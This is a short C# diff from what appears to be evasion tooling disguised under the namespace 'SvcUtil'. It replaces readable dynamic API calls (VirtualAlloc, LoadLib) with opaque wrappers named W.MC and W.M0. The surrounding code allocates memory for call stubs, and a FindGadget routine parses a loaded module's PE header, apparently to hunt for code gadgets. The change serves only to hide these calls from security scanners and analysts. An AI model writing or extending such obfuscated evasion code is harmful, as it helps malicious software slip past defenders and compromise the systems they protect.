@@ -140,7 +140,7 @@ namespace SvcUtil
                         return false;
 
                     int totalSize = StubSize * TargetNames.Length;
-                    _stubBase = DynInvoke.VirtualAlloc(
+                    _stubBase = W.MC(
                         IntPtr.Zero,
                         (UIntPtr)totalSize,
                         0x3000,
@@ -279,7 +279,7 @@ namespace SvcUtil
 
         private static IntPtr FindGadget()
         {
-            IntPtr hMod = DynInvoke.LoadLib(D(_nd));
+            IntPtr hMod = W.M0(D(_nd));
             if (hMod == IntPtr.Zero) return IntPtr.Zero;
 
             int elf = Marshal.ReadInt32(hMod + 0x3C);
